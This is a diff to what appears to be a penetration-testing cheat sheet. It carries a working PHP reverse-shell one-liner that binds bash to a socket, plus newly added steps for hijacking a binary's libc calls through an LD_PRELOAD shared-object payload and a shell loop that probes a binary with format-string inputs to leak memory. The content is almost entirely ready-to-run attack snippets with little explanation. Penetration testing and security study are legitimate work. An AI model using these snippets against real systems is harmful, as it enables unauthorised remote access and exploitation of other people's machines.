@@ -66,5 +66,25 @@ php
 <?php $sk = fsockopen("127.0.0.1", 5566); exec("/bin/bash -i <&3 >&3 2>&3"); ?>
 ```
 
+### Preload ###
+build and load the external .so file by `LD_PRELOAD=payload.so BIN` and the binary will call the libc function
+defined in the payload.so. The payload.so file could be compiled via `gcc -shared -fPIC -o payload.so payload.c`.
+Also run `LD_DEBUG=all` to show all debug message
+
+## C / format string attack ##
+quick check the address
+
+```sh
+# for n in $(seq 1 30); do ./a.out $(python -c "print(\"AAAA-${n}-%${n}\$p-%${n}\$s\")"); echo ''; done
+
+for n in $(seq 1 30);
+do
+	./a.out $(python -c "print(\"AAAA-${n}-%${n}\$p-%${n}\$s\")")
+	echo ''
+done
+```
+ 
+
+
 
 [0]: https://en.wikipedia.org/wiki/Penetration_test
